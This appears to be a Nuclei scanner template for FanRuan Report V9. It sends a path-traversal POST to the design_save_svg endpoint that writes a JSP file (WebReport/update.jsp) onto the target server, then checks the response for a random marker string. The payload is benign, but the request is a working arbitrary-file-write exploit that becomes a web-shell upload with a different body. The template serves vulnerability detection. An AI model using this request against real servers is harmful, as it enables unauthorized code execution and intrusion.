id: fanruanOA-v9-design-save-svg-file-upload
info:
  name: 帆软报表 V9 design_save_svg 任意文件覆盖文件上传
  author: cnaq
  severity: high
  description: 帆软 V9 存在任意文件覆盖，导致攻击者可以任意文件上传
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20V9%20design_save_svg%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html
  tags: fanruanOA,V9,file,upload
requests:
  - raw:
      - |
        POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
        Host: {{Hostname}} 
        Content-Type:text/xml;charset=UTF-8

        {"__CONTENT__":"<%out.println(\"{{randstr}}\");%>","__CHARSET__":"UTF-8"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - '{{randstr}}'